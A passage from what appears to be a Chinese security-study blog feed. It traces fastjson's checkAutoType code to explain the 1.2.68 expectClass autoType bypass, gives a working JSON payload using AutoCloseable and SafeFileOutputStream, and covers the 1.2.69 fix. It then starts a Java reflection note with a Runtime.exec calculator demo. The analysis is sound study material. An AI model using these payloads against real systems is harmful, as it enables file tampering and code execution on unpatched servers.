(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回到 <strong>parseObject</strong> 后，一路往下，一直到
<strong>deserialze</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultJSONParser (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line">    <span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">            &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">            &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">        <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JavaBeanDeserializer#deserialze</strong> 中，读下一个
<strong>key</strong> 发现还是 <strong><span class="citation"
data-cites="type">@type</span></strong>，因此进入
<strong>if</strong>，<strong>13</strong> 行处读到
<strong>typeName</strong> 为
<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong>，而后
<strong>24</strong> 行处 <strong>deserializer</strong> 为空，因此进入
<strong>27</strong> 行的 <strong>if</strong>，先拿到
<strong>expectClass</strong> 为 上文传入的
<strong>AutoCloseable</strong>，然后在 <strong>29</strong> 行处再次进入
<strong>checkAutoType</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, // </span></span><br><span class="line"><span class="params">                           Type type, // </span></span><br><span class="line"><span class="params">                           Object fieldName, // </span></span><br><span class="line"><span class="params">                           Object object, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span> features, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span>[] setFlags)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> ((typeKey != <span class="literal">null</span> &amp;&amp; typeKey.equals(key))</span><br><span class="line">            || JSON.DEFAULT_TYPE_KEY == key) &#123;</span><br><span class="line">        lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getSeeAlso(config, <span class="built_in">this</span>.beanInfo, typeName);</span><br><span class="line">            Class&lt;?&gt; userType = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (deserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">                userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());</span><br><span class="line">                deserializer = parser.getConfig().getDeserializer(userType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时再次进入
<strong>checkAutoType</strong>，<strong>expectClass</strong>
经过判断使得 <strong>expectClassFlag</strong> 为
<strong>true</strong>，同时
<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong>
不在黑白名单中，因此一路往下到 <strong>22</strong> 行过
<strong>check</strong>，带着 <strong>cacheClass</strong> 为
<strong>false</strong> 进入 <strong>TypeUtils.loadClass</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">    <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">        expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                || expectClass == Serializable.class</span><br><span class="line">                || expectClass == Cloneable.class</span><br><span class="line">                || expectClass == Closeable.class</span><br><span class="line">                || expectClass == EventListener.class</span><br><span class="line">                || expectClass == Iterable.class</span><br><span class="line">                || expectClass == Collection.class</span><br><span class="line">                ) &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>loadClass</strong> 中使用了
<strong>contextClassLoader</strong> 拿到
<strong>SafeFileOutputStream</strong> 返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TypeUtils (com.alibaba.fastjson.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">// className: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, classLoader: null, cache: false</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回到 <strong>checkAutoType</strong>，先判断 <strong>clazz</strong>
不是来自于 <strong>ClassLoader、DataSource</strong> 和
<strong>RowSet</strong> 的子类，以此过滤 <strong>JNDI</strong>
注入，然后 <strong>18</strong> 行处判断 <strong>clazz</strong> 是否属于
<strong>expectClass</strong> 子类，是则加入
<strong>mappings</strong>，否则报错，最后返回
<strong>SafeFileOutputStream</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (jsonType) &#123;</span><br><span class="line">            TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//</span></span><br><span class="line">                ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">        <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回 <strong>SafeFileOutputStream</strong> 到
<strong>JavaBeanDeserializer#deserialze</strong>
后就是调用构造函数完成反序列化操作了，到此基本结束。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, // </span></span><br><span class="line"><span class="params">                           Type type, // </span></span><br><span class="line"><span class="params">                           Object fieldName, // </span></span><br><span class="line"><span class="params">                           Object object, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span> features, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span>[] setFlags)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> (deserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">        userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());</span><br><span class="line">        deserializer = parser.getConfig().getDeserializer(userType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">typedObject</span> <span class="operator">=</span> deserializer.deserialze(parser, userType, fieldName);</span><br><span class="line">    <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">        <span class="type">JavaBeanDeserializer</span> <span class="variable">javaBeanDeserializer</span> <span class="operator">=</span> (JavaBeanDeserializer) deserializer;</span><br><span class="line">        <span class="keyword">if</span> (typeKey != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">FieldDeserializer</span> <span class="variable">typeKeyFieldDeser</span> <span class="operator">=</span> javaBeanDeserializer.getFieldDeserializer(typeKey);</span><br><span class="line">            <span class="keyword">if</span> (typeKeyFieldDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">                typeKeyFieldDeser.setValue(typedObject, typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (T) typedObject;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结-14">总结</h3>
<p>和 <strong>1.2.47</strong> 有一些类似，这里是利用
<strong>expectClass</strong> 来二次加载 <strong>expectClass</strong>
的子类绕过，而 <strong>expectClass</strong> 的选取需要在
<strong>TypeUtils#addBaseClassMappings</strong> 内，但不能在
<strong>INTERNAL_WHITELIST_HASHCODES</strong>
与黑名单内，而其子类的选取也不能位于黑名单内。</p>
<p>此处的利用链较多，不再赘述。</p>
<h3 id="例子-14">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;tempPath\&quot;: \&quot;/tmp/1\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;targetPath\&quot;: \&quot;/tmp/2\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-9">修复</h3>
<p>官方在 <strong>1.2.69</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/9af851152ec142d394a6c8dd0813d33e71adb410">修复</a>，把
<strong>expectClass</strong> 替换为 <strong>expectHash</strong>。</p>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 30%" />
<col style="width: 27%" />
<col style="width: 32%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">1.2.69</td>
<td>-1368967840069965882L</td>
<td>0xed007300a7b227c6L</td>
<td>java.lang.AutoCloseable</td>
</tr>
<tr class="even">
<td style="text-align: left;">1.2.69</td>
<td>2980334044947851925L</td>
<td>0x295c4605fd1eaa95L</td>
<td>java.lang.Readable</td>
</tr>
<tr class="odd">
<td style="text-align: left;">1.2.69</td>
<td>5183404141909004468L</td>
<td>0x47ef269aadc650b4L</td>
<td>java.lang.Runnable</td>
</tr>
</tbody>
</table>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_8e22f7d7ef264d15534113b03b1e3707d9581b42.png" /></p>
<h1 id="refer">Refer</h1>
<p><a href="http://wjlshare.com/archives/1522">浅谈 <strong>Java
RMI</strong></a></p>
<p><a
href="https://evilpan.com/2021/12/13/jndi-injection"><strong>JNDI</strong>
注入漏洞的前世今生</a></p>
<p><a
href="https://blog.51cto.com/u_14071606/4910629"><strong>Java</strong>
反序列化（之）<strong>JNDI</strong> 注入</a></p>
<p><a href="http://wjlshare.com/archives/1526"><strong>Fastjson
JdbcRowSetImpl</strong> 链及后续漏洞分析</a></p>
<p><a href="https://blog.51cto.com/u_14071606/4555676"><strong>FastJson
JdbcRowSetImpl</strong> 链分析</a></p>
<p><a
href="https://www.anquanke.com/post/id/240446#h3-6"><strong>Java</strong>
安全之 <strong>FastJson JdbcRowSetImpl</strong> 链分析</a></p>
<p><a
href="https://alewong.github.io/2020/09/10/Fastjson-1-2-48-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><strong>Fastjson-1-2-48-RCE</strong>
漏洞复现与分析</a></p>
<p><a
href="https://zhuanlan.zhihu.com/p/140519505"><strong>Fastjson&lt;=1.2.47</strong>
反序列化漏洞复现及分析</a></p>
<p><a
href="https://zhuanlan.zhihu.com/p/157211675"><strong>fastjson</strong>
到底做错了什么？为什么会被频繁爆出漏洞？</a></p>
<p><a
href="http://www.zzy0.cn/#!./Java/fastjson.md"><strong>Json</strong>
反序列化漏洞</a></p>
<p><a href="https://xz.aliyun.com/t/7027"><strong>JAVA</strong>
反序列化—<strong>FastJson</strong> 组件</a></p>
<p><a href="https://jlkl.github.io/2021/12/18/Java_07/"><strong>Fastjson
parse</strong> 突破特殊 <strong>getter</strong> 调用限制</a></p>
<p><a
href="http://www.red3691.top/2021/12/20/Fastjson-TemplatesImpl%E9%93%BE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><strong>Fastjson
TemplatesImpl</strong> 链反序列化漏洞分析</a></p>
<p><a
href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/"><strong>fastjson</strong>
不出网利用简析</a></p>
<p><a href="https://tttang.com/archive/1405/">探索高版本
<strong>JDK</strong> 下 <strong>JNDI</strong> 漏洞的利用方法</a></p>
<p><a href="https://www.anquanke.com/post/id/232774">浅析
<strong>Fastjson1.2.62-1.2.68</strong> 反序列化漏洞</a></p>
<p><a href="http://wjlshare.com/archives/1512"><strong>FastJason
1.2.22-1.2.24 TemplatesImpl</strong> 利用链分析</a></p>
<p><a
href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><strong>Fastjson</strong>
系列二——<strong>1.2.22-1.2.24</strong> 反序列化漏洞</a></p>
<p><a
href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/"><strong>fastjson</strong>
不出网利用简析</a></p>
<p><a href="https://b1ue.cn/archives/506.html"><strong>fastjson</strong>
读文件 <strong>gadget</strong> 的利用场景扩展</a></p>
<p><a href="https://b1ue.cn/archives/382.html"><strong>fastjson 1.2.68
autotype bypass</strong> 反序列化漏洞 <strong>gadget</strong>
的一种挖掘思路</a></p>
<p><a
href="https://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><strong>fastjson
1.2.68</strong> 漏洞分析</a></p>
<a
href="https://www.javasec.org/java-vuls/FastJson.html"><strong>Fastjson</strong>
反序列化漏洞</a>
<script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script>
<textarea id="flowchart-0-code" style="display: none">s=>start: 开始
e=>end: 结束
op1=>subroutine: getOutputProperties
op2=>subroutine: newTransformer
op3=>subroutine: getTransletInstance
op4=>operation: _class[i] = loader.defineClass(_bytecodes[i])
cond1=>condition: _class==null
op5=>operation: _class[_transletIndex].getConstructor().newInstance()
sub=>subroutine: defineTransletClasses
op6=>operation: _class[i] = loader.defineClass(_bytecodes[i])
cond2=>condition: _class[i]父类合法
op7=>operation: _transletIndex=i
s(right)->op1->op2->op3->cond1
cond2(yes,right)->op7->op5
cond1(yes,right)->sub(right)->cond2
cond1(no)->op5->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Java</tag>
        <tag>Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的反序列化笔记</title>
    <url>/Study-Unserialize-Java/</url>
    <content><![CDATA[<p>。这下从零开始了。</p>
<span id="more"></span>
<h1 id="前置">前置</h1>
<p><strong><a href="./Study-Java-IO">复习 Java 的 IO
相关</a></strong></p>
<h1 id="反射">反射</h1>
<p><strong>Java</strong>
的反射是指程序在运行期可以拿到一个对象的所有信息，是为了解决在运行期，对某个对象一无所知的情况下，对其方法进行调用。</p>
<p><strong>Java</strong> 中的所有类都表现为 <strong>class</strong>
对象，包括 <strong>8</strong> 种基本类和 <strong>interface</strong>
等。</p>
<p>而 <strong>class</strong> 对象是 <strong>JVM</strong>
在执行过程中动态加载的，每加载一种
<strong>class</strong>，<strong>JVM</strong> 便创建一个
<strong>Class</strong> 实例与其关联，并在该实例中保留了该
<strong>class</strong> 的所有信息，包括类名，接口，方法等。因此获得了
<strong>Class</strong> 实例，便可获得与其关联的 <strong>class</strong>
的所有信息。</p>
<blockquote>
<p>这里的 <strong>Class</strong> 是名为 <strong>Class</strong> 的
<strong>class</strong>，只有 <strong>JVM</strong> 可以创建
<strong>Class</strong>，自己编写的程序不行。</p>
</blockquote>
<h2 id="获取-class-实例">获取 Class 实例</h2>
<p>获取 <strong>Class</strong> 实例的方法有 <strong>3</strong> 种：</p>
<h3 id="根据类名">根据类名</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> String.class;</span><br></pre></td></tr></table></figure>
<h3 id="根据对象">根据对象</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">south</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> south.getClass();</span><br></pre></td></tr></table></figure>
<h3 id="根据全限定类名">根据全限定类名</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>而由于 <strong>Class</strong> 是唯一的，因此上述方法获得的
<strong>cls</strong> 是相等的。</p>
<p>对于 <strong>forName</strong> 方法，有 <strong>2</strong>
个函数重载，其关系从源码便可一眼看出。</p>
<h4 id="fornamestring-classname">forName(String className)</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">    <span class="keyword">return</span> forName0(className, <span class="literal">true</span>, ClassLoader.getClassLoader(caller), caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4
id="fornamestring-name-boolean-initialize-classloader-loader">forName(String
name, boolean initialize, ClassLoader loader)</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String name, <span class="type">boolean</span> initialize, ClassLoader loader) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; caller = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Reflective call to get caller class is only needed if a security manager</span></span><br><span class="line">        <span class="comment">// is present.  Avoid the overhead of making this call otherwise.</span></span><br><span class="line">        caller = Reflection.getCallerClass();</span><br><span class="line">        <span class="keyword">if</span> (sun.misc.VM.isSystemDomainLoader(loader)) &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> ClassLoader.getClassLoader(caller);</span><br><span class="line">            <span class="keyword">if</span> (!sun.misc.VM.isSystemDomainLoader(ccl)) &#123;</span><br><span class="line">                sm.checkPermission(</span><br><span class="line">                        SecurityConstants.GET_CLASSLOADER_PERMISSION);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> forName0(name, initialize, loader, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的 <strong>initialize</strong>
变量并不表示着常规构造函数的初始化与否，而是类静态代码块的初始化与否，即
<strong>static{}</strong> 中间的内容。</p>
<p>值得一提的是，对于普通类中的内部类，是可以和普通类看作两个无关类的，其编译会生成两个文件。</p>
<p>使用 <strong>$</strong> 符号来查找加载内部类，比如
<strong>Class.forName("C1$C2")</strong>。</p>
<h2 id="实例化操作">实例化操作</h2>
<p>获取<strong>Class</strong>后，可以继续反射获得类中的成员变量等信息，也可以对其进行实例化。</p>
<h3 id="newinstance">newInstance</h3>
<ol type="1">
<li>需要存在无参构造函数</li>
<li>需要存在公开成员变量</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">clazz.newInstance();</span><br></pre></td></tr></table></figure>
<h3 id="getmethod">getMethod</h3>
<ol type="1">
<li><strong>getMethod</strong>
获取的需要是公开方法，包括从父类继承的</li>
<li>后跟传参类型来确定重载的方法</li>
<li><strong>invoke</strong> 对普通方法传入实例，对静态方法传入
<strong>null</strong>，后跟传参的值</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="getconstructor">getConstructor</h3>
<ol type="1">
<li>没有无参构造时可用</li>
<li>同样借助传参类型来确定重载方法</li>
<li>对于可变长参数可传数组类来确定</li>
</ol>
